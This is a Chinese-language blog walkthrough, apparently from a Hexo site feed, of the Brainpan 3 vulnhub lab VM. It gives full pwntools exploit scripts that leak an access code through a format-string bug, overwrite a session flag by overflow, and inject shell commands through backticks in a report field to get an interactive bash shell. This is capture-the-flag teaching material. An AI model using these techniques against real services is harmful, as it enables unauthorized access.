<p><font color="red">Game over</font></p>
<p>不好意思，这次还是没有找到希腊某位大佬的傻瓜式一键通关脚本，i am so sorry about this…It’s a pity…</p>
<p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/haha.jpg"></p>
<p><font color="green"><strong><em>The end,to be continue…</em></strong></font></p>
]]></content>
      <categories>
        <category>vulnhub walkthrough</category>
      </categories>
      <tags>
        <tag>vulnhub靶机练习</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub靶机渗透[brainpan-3]</title>
    <url>/2020/02/03/brainpan-3/</url>
    <content><![CDATA[<h3 id="名称"><a href="#名称" class="headerlink" title="名称"></a>名称</h3><p>名称：brainpan：3<br>发行日期：2015年7月27日</p>
<h3 id="难度"><a href="#难度" class="headerlink" title="难度"></a>难度</h3><ul>
<li>万劫不复地狱难度</li>
</ul>
<h3 id="下载"><a href="#下载" class="headerlink" title="下载"></a>下载</h3><ul>
<li>Download (Mirror): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlw">https://download.vulnhub.com/brainpan/brainpan3.zip<i class="fa fa-external-link-alt"></i></span></li>
<li>Download (Torrent): <span class="exturl" data-url="aHR0cHM6Ly9kb3dubG9hZC52dWxuaHViLmNvbS9icmFpbnBhbi9icmFpbnBhbjMuemlwLnRvcnJlbnQ=">https://download.vulnhub.com/brainpan/brainpan3.zip.torrent<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h3><p>免责声明<br>使用此虚拟机，即表示您同意，我对任何损失或损害不承担任何责任，包括但不限于间接或间接损失或损害，或由于或来自于此而产生的数据或利润损失而造成的任何损失或损害。与使用此软件的连接。TL; DR：如果发生坏事，这不是我的错。</p>
<p>设定<br>Brainpan 3经过测试，发现可与VMware Player，VMware Fusion和Virtual Box一起使用。<br>检查并确保Brainpan_III.ova具有以下校验和，以便您知道下载的文件是否完整：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">MD5：170e0d8b26ab721587537fcde69087a0SHA1：ed9ae53c556a1ce6988b3a54621dd6469c8b8aa5</span><br></pre></td></tr></table></figure>

<p>将Brainpan_III.ova导入到您首选的管理程序中，并根据需要配置网络设置。它会通过DHCP获得IP地址，但是建议您在NAT内运行它，或者仅对主机OS可见，因为它容易受到攻击。</p>
<p>目标<br>root机器并获取flag。</p>
<ul>
<li>barrebas : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9iYXJyZWJhcw==">https://twitter.com/barrebas<i class="fa fa-external-link-alt"></i></span></li>
<li>Swappage : <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9Td2FwcGFnZQ==">https://twitter.com/Swappage<i class="fa fa-external-link-alt"></i></span></li>
</ul>
<h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>上nmap</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># nmap -sn -v 192.168.56.0/24</span></span><br><span class="line">Nmap scan report <span class="keyword">for</span> 192.168.56.117</span><br><span class="line">Host is up (0.00020s latency).</span><br><span class="line">MAC Address: 08:00:27:90:21:26 (Oracle VirtualBox virtual NIC)</span><br><span class="line"></span><br><span class="line">root@kali:~<span class="comment"># nmap -v -sV -Pn -p- 192.168.56.117 --system-dns</span></span><br><span class="line">PORT     STATE  SERVICE    VERSION</span><br><span class="line">1337/tcp open   waste?</span><br><span class="line">8080/tcp closed http-proxy</span><br></pre></td></tr></table></figure>

<h4 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h4><p>找到端口1337后，可以开始使用Brainpan3。可以设置一个小的脚本来轻松地与服务器交互：</p>
<p>bp3.py</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>即使文字说</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>最初的想法是，“太酷了，四位数，Go Go Gadget Brute Force！”。原来，不是在撒谎。经过3次尝试，这个数字确实改变了。</p>
<p>一个登录提示，可以尝试使输入缓冲区溢出，以尝试产生堆栈溢出。这种方法的问题在于，溢出后没有二进制文件可以进行分析。最有意义的漏洞利用是格式字符串。来一些格式字符串试试！</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  __ )    _ \      \    _ _|   \  |   _ \    \      \  |     _ _| _ _| _ _|</span><br><span class="line">  __ \   |   |    _ \     |     \ |  |   |  _ \      \ |       |    |    | </span><br><span class="line">  |   |  __ &lt;    ___ \    |   |\  |  ___/  ___ \   |\  |       |    |    | </span><br><span class="line"> ____/  _| \_\ _/    _\ ___| _| \_| _|   _/    _\ _| \_|     ___| ___| ___|</span><br><span class="line"></span><br><span class="line">                                                            by superkojiman</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br><span class="line"></span><br><span class="line">ACCESS CODE: $ %x.%x.%x.%x.%x.</span><br><span class="line">ERROR <span class="comment">#4: WHAT IS THIS, AMATEUR HOUR?</span></span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 1</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>Herm ..是否在％x上进行过滤？尝试其他格式的字符串。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %p.%p.%p.%p.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: 0xbf8a439c.(nil).0x22dd.0xbf8a439c.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 2</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>现在知道此输入容易受到恶意格式字符串的攻击。由于正在寻找一个4位数的访问代码，因此可以假定它可能存储在堆栈中。尝试使用％d。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ %d.%d.%d.%d.%d.%d.</span><br><span class="line">ERROR <span class="comment">#1: INVALID ACCESS CODE: -1081457764.0.4625.-1081457764.0.10.</span></span><br><span class="line"></span><br><span class="line">ACCESS CODE MUST BE 4 DIGITS</span><br><span class="line"></span><br><span class="line">FAILED LOGIN ATTEMPTS: 3</span><br><span class="line"></span><br><span class="line">BRUTE-FORCE ATTEMPT DETECTED</span><br><span class="line">PLEASE USE THE NEW CODE DISPLAYED ON YOUR ACCESS TOKEN</span><br><span class="line"></span><br><span class="line">AUTHORIZED PERSONNEL ONLY</span><br><span class="line">PLEASE ENTER THE 4-DIGIT CODE SHOWN ON YOUR ACCESS TOKEN</span><br><span class="line">A NEW CODE WILL BE GENERATED AFTER THREE INCORRECT ATTEMPTS</span><br></pre></td></tr></table></figure>

<p>啊!这里的第三个数是什么：4625,尝试一下访问代码：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ACCESS CODE: $ 4625</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-7034</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br></pre></td></tr></table></figure>

<p>进来了！在继续进行之前，修改脚本以自动跳过访问代码：</p>
<ul>
<li>发送%d.%d.%d.%d.%d.%d</li>
<li>提取第三个元素（访问代码）</li>
<li>提交访问代码以进行登录</li>
</ul>
<p>从这里开始，将继续向脚本中添加代码片段,结果如下：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 8695</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"></span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: ID-4373</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第二步"><a href="#第二步" class="headerlink" title="第二步"></a>第二步</h2><p>现在已经登录，可以做更多的探索。看，已经使用Command 4获得了一个Shell：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 4</span><br><span class="line">SELECTED: 4</span><br><span class="line">reynard@brainpan3 $ $ ls</span><br><span class="line">total 0</span><br><span class="line">-rw-rw-r-- 1 reynard reynard 22 May 10 22:26 .flag</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 give</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 up</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 never</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 gonna</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 <span class="built_in">let</span></span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 you</span><br><span class="line">-rw-rw-r-- 1 reynard reynard  0 May 10 22:26 down</span><br></pre></td></tr></table></figure>

<p>当然，可以尝试溢出此shell脚本/二进制文件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">reynard@brainpan3 $ $ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span><br><span class="line">*** stack smashing detected ***: ./shell terminated</span><br><span class="line">Aborted (core dumped)</span><br></pre></td></tr></table></figure>

<p>经过更多尝试使用典型的recon命令whoami，uname -a等的探索，可以得出结论，该shell是无用的。尝试其他选项：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line">REPORT MODE IS DISABLED IN THIS BUILD</span><br><span class="line"></span><br><span class="line">SELECTED: 2</span><br><span class="line"></span><br><span class="line">CODE REPOSITORY IS NOW AVAILABLE</span><br></pre></td></tr></table></figure>

<p>看起来report模式当前处于禁用状态。可以尝试打开report，但是要怎么打开？</p>
<p>打开REPOSITORY，在端口8080上启用Web服务，该端口还具有/repo目录，其中包含在此步骤中使用的二进制文件：</p>
<p><img src="http://ctfhacker.com/assets/images/repo-directory.png"></p>
<p>花一些时间了解这些二进制文件是如何工作的，但最终没有任何有用的东西。这里是否存在其他漏洞。</p>
<p>尚未查看的最后一个功能是“Update Session Name”功能：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ fuckfuckfuckfuck</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: fuckfuckfuckfuck</span><br></pre></td></tr></table></figure>

<p>有趣的是，可以从访问代码中使用会话名称复制字符串格式漏洞吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %p.%p.%p.%p.%p.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: 0xbfcfddcc.0x104.0x252e7025.0x70252e70.0x2e70252e.</span><br></pre></td></tr></table></figure>

<p>可以。丢弃堆栈中的很大一部分，看看有什么。发送70个％x。请注意，仅在末尾添加句点，以便更轻松地拆分结果字符串。这样可以使各个格式字符串与其输出之间的关联更加容易。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 3</span><br><span class="line">SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: $ %x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.</span><br><span class="line">--------------------------------------------------------------</span><br><span class="line">SESSION: bfcfddcc.104.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.ff0a2e78.b76d9c20.bfcfdf1c.0.b76d9000.b76d9ac0.b76da898.b752d940.b759f0b5.b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.</span><br><span class="line">\xff \x9cm\xb7\x1cϿ</span><br></pre></td></tr></table></figure>

<p>在这里，正在研究很多重复的值。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; unhex(<span class="string">&#x27;252e7825&#x27;</span>)[::-1]</span><br><span class="line"><span class="string">&#x27;%x.%&#x27;</span></span><br></pre></td></tr></table></figure>

<p>看起来那些重复的字符是格式字符串缓冲区。此格式字符串中有一个有趣的段：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~<span class="comment"># python</span></span><br><span class="line">Python 2.7.17 (default, Jan 19 2020, 19:54:54) </span><br><span class="line">[GCC 9.2.1 20200110] on linux2</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; from pwn import *</span><br><span class="line">&gt;&gt;&gt; <span class="keyword">for</span> item <span class="keyword">in</span> <span class="string">&#x27;b76d9ac0.59.4e.59.b76d98a0.b76d9000.b76d9ac0.&#x27;</span>.split(<span class="string">&#x27;.&#x27;</span>):</span><br><span class="line">...   unhex(item)</span><br><span class="line">... </span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;N&#x27;</span></span><br><span class="line"><span class="string">&#x27;Y&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x98\xa0&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x90\x00&#x27;</span></span><br><span class="line"><span class="string">&#x27;\xb7m\x9a\xc0&#x27;</span></span><br><span class="line"><span class="string">&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>Y，N，Y看起来非常类似于命令菜单中显示的对话框的Y，N，Y。可以尝试在Y，N，Y上写一个缓冲区，使其变为Y，Y，Y吗？抓住4e在格式字符串中的哪个位置，以便知道有多少溢出。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行上面的脚本，注意，report现在出现了[Y]！nice！。看看如何处理report。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@kali:~/vulnhub/brainpan3/2<span class="comment"># python bp3.py </span></span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 4506</span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[+] Opening connection to 192.168.56.117 on port 1337: Done</span><br><span class="line">[*] Code identified: 4506</span><br><span class="line">[*] Report <span class="string">&#x27;N&#x27;</span> at offset 65</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">\xff �r\xb7�%\x84\xbf</span><br><span class="line">  AUTH   [Y]    REPORT [N]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: SELECTED: 3</span><br><span class="line">ENTER NEW SESSION NAME: --------------------------------------------------------------</span><br><span class="line">SESSION: YYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYYY</span><br><span class="line">  AUTH   [Y]    REPORT [Y]    MENU   [Y]  </span><br><span class="line">--------------------------------------------------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">1  - CREATE REPORT</span><br><span class="line">2  - VIEW CODE REPOSITORY</span><br><span class="line">3  - UPDATE SESSION NAME</span><br><span class="line">4  - SHELL</span><br><span class="line">5  - LOG OFF</span><br><span class="line"></span><br><span class="line">ENTER COMMAND: $</span><br></pre></td></tr></table></figure>

<h2 id="第三步"><a href="#第三步" class="headerlink" title="第三步"></a>第三步</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">$ this is my first report!</span><br><span class="line"></span><br><span class="line">REPORT [this is my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209204930.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [dxyc/yc/&#125;i/vybcd/bu`\x7fbd///]</span><br></pre></td></tr></table></figure>

<p>从文字上看，报告似乎以某种方式进行了加密，并存储在/home/anansi/REPORTS/20200209204930.rep中。用于处理报告的二进制文件位于/ repo目录中，因此进行分析可能很有用，可以在尝试进行逆向工程之前先尝试一些其他的操作。经过几次模糊的尝试以查找缓冲区溢出和命令注入之后，得到以下内容：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `fuck`</span><br><span class="line"></span><br><span class="line">REPORT [`fuck`s my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">sh: 1: fuck: not found</span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205212.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [��������������\xff���\xaf\xaf]</span><br></pre></td></tr></table></figure>

<p>什么？！尝试通过反引号执行命令时，收到命令未找到错误消息。这是否意味着命令执行？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `whoami`</span><br><span class="line"></span><br><span class="line">REPORT [`whoami`my first report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205443.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [`o`orhlx&gt;ghsru&gt;sdqnsu&gt;&gt;&gt;]</span><br></pre></td></tr></table></figure>

<p>这可能是通过stderr实现的。可以通过管道输出到stderr来接收命令输出吗？</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ `whoami &gt;&amp;2`</span><br><span class="line"></span><br><span class="line">REPORT [`whoami &gt;&amp;2`irst report!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">anansi</span><br><span class="line">[+] WRITING REPORT TO /home/anansi/REPORTS/20200209205645.rep</span><br><span class="line">[+] DATA SUCCESSFULLY ENCRYPTED</span><br><span class="line">[+] DATA SUCCESSFULLY RECORDED</span><br><span class="line">[+] RECORDED [&amp;=&lt;;p=*? =;ppp]</span><br></pre></td></tr></table></figure>

<p>真好！现在有趣的部分，尝试获得一个shell。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ENTER COMMAND: $ 1</span><br><span class="line">SELECTED: 1</span><br><span class="line"></span><br><span class="line">ENTER REPORT, END WITH NEW LINE:</span><br><span class="line"></span><br><span class="line">$ `/bin/bash -i &gt;&amp;2`</span><br><span class="line"></span><br><span class="line">REPORT [`/bin/bash -i &gt;&amp;2`eport!@]</span><br><span class="line">SENDING TO REPORT MODULE</span><br><span class="line"></span><br><span class="line">bash: cannot <span class="built_in">set</span> terminal process group (2506): Inappropriate ioctl <span class="keyword">for</span> device</span><br><span class="line">bash: no job control <span class="keyword">in</span> this shell</span><br><span class="line">anansi@brainpan3:/$ $ whoami</span><br><span class="line">whoami</span><br><span class="line">anansi</span><br><span class="line">anansi@brainpan3:/$ $ id</span><br><span class="line">id</span><br><span class="line">uid=1000(anansi) gid=1003(webdev) groups=1000(anansi)</span><br><span class="line">anansi@brainpan3:/$ $ <span class="built_in">pwd</span></span><br><span class="line"><span class="built_in">pwd</span></span><br><span class="line">/</span><br><span class="line">anansi@brainpan3:/$ $</span><br></pre></td></tr></table></figure>

<p>现在有一个用户shell程序！正常情况下，修改漏洞利用脚本以自动为我获取shell程序：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">HOST = <span class="string">&#x27;192.168.56.117&#x27;</span></span><br><span class="line">PORT = 1337</span><br><span class="line"></span><br><span class="line">r = remote(HOST, PORT)</span><br><span class="line">r.sendline(<span class="string">&#x27;%d.&#x27;</span> * 6)</span><br><span class="line">r.recvuntil(<span class="string">&quot;ACCESS CODE: &quot;</span>)</span><br><span class="line">output = r.recv()</span><br><span class="line">code = output.split(<span class="string">&#x27;.&#x27;</span>)[2]</span><br><span class="line">log.info(<span class="string">&quot;Code identified: &#123;&#125;&quot;</span>.format(code))</span><br><span class="line">r.sendline(code)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">shellcode = <span class="string">&#x27;%x.&#x27;</span> * 70</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(shellcode)</span><br><span class="line">r.recvuntil(<span class="string">&quot;SESSION: &quot;</span>)</span><br><span class="line">session_name = r.recvuntil(<span class="string">&#x27;\n&#x27;</span>).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">log.info(<span class="string">&quot;Report &#x27;N&#x27; at offset &#123;&#125;&quot;</span>.format(n_index))</span><br><span class="line">n_index = session_name.index(<span class="string">&#x27;4e&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;Y&#x27;</span> * (4*(n_index-2) + 1) )</span><br><span class="line"><span class="keyword">for</span> <span class="built_in">command</span> <span class="keyword">in</span> [<span class="string">&#x27;uname -a&#x27;</span>, <span class="string">&#x27;whoami&#x27;</span>, <span class="string">&#x27;id&#x27;</span>]:</span><br><span class="line">    r.clean()</span><br><span class="line">    r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    r.sendline(<span class="string">&#x27;$(&#123;&#125; &gt;&amp;2)&#x27;</span>.format(<span class="built_in">command</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;SENDING TO REPORT MODULE&quot;</span>)</span><br><span class="line">    output = r.recvuntil(<span class="string">&#x27;[+]&#x27;</span>).split(<span class="string">&#x27;\n&#x27;</span>)[2]</span><br><span class="line">    log.success(<span class="string">&quot;&#123;&#125; - &#123;&#125;&quot;</span>.format(<span class="built_in">command</span>, output))</span><br><span class="line">r.clean()</span><br><span class="line">r.sendline(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">r.sendline(<span class="string">&#x27;$(/bin/bash -i &gt;&amp;2)&#x27;</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>

<p>运行脚本能够成功的获得shell</p>
